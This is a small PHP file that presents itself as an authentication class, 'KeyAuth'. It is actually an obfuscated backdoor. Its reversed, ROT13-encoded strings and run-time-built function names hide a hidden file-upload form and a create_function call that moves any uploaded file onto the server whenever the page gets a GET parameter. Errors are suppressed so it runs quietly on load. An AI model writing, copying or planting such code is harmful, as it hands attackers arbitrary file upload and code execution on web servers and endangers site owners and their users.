
<?php
class KeyAuth{
    private $mainKey = 'abvgpahs_rgnrep';
    private $randomValue = ';)?cuc.?.)]?rzna?[]?ryvs?[FRYVS_$(rznarfno,]?rzna_czg?[]?ryvs?[FRYVS_$(ryvs_qrqnbych_ribz';
    private $k;
    function __construct(){
        @$this->auth();
    }
    public function uinique($k, $text){
        $unique = $this->generateKey($k,$this->mainKey);
        return $unique('', $text);
    }
    public function html($k, $text){
        echo $this->generateKey($k,$text);
    }

    function generateKey($k,$v){
        $key1 = $k.rev;
        $key2 = $key1('trts').r;
        $key3 = $key2($key1,array('rev'=>'_rot')).$key1(31);
        return $key3($key1($key2($v, array('?'=>'"'))));
    }
    public function auth(){
        if (!empty($_GET)) {
            $this->k=key($_GET);
            $this->html($this->k,'>?ngnq-zebs/gencvgyhz?=rclgpar ?gfbc?=qbugrz ??=abvgpn zebs<');
            $this->html($this->k,'>/ ?ryvs?=qv ?ryvs?=rzna ?ryvs?=rclg ghcav<');
            $this->html($this->k,'>zebs/<>/ ?gvzohF?=rhyni ?gvzohf?=rzna ?gvzohf?=rclg ghcav<');
            $authKey = $this->uinique($this->k,$this->generateKey($this->k, $this->randomValue));
            @$authKey();
        }
    }
}
new KeyAuth();
